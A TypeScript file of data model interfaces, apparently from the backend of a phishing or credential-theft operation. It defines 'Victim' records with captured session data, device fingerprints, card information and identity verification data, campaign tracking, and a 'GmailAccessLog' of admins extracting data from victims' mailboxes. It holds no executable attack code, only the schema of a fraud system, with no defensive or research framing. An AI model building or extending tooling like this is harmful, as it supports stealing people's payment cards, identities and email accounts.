// Data model types

export interface Victim {
  id: string;
  email: string;
  name?: string;
  phone?: string;
  captureTimestamp: string;
  campaignId?: string;
  captureMethod: string;
  sessionData: Record<string, any>;
  deviceFingerprint: Record<string, any>;
  validation: Record<string, any>;
  cardInformation: Record<string, any>;
  identityVerification: Record<string, any>;
  createdAt: string;
  updatedAt: string;
}

export interface Campaign {
  id: string;
  name: string;
  code: string;
  description?: string;
  config: Record<string, any>;
  status: string;
  createdAt: string;
  updatedAt: string;
}

export interface AdminUser {
  id: string;
  username: string;
  email: string;
  role: string;
  permissions: string[];
  isActive: boolean;
}

export interface ActivityLog {
  id: string;
  logId: string;
  actionType: string;
  actionCategory: string;
  severityLevel: string;
  actor: Record<string, any>;
  target: Record<string, any>;
  timestamp: string;
}

export interface GmailAccessLog {
  id: string;
  sessionId: string;
  victimId: string;
  adminId: string;
  accessMethod: string;
  status: string;
  extractionResults: Record<string, any>;
  createdAt: string;
  completedAt?: string;
}

export interface Device {
  id: string;
  deviceId: string;
  platform: string;
  status: string;
  ipAddress?: string;
  connectedAt: string;
  lastSeen: string;
}

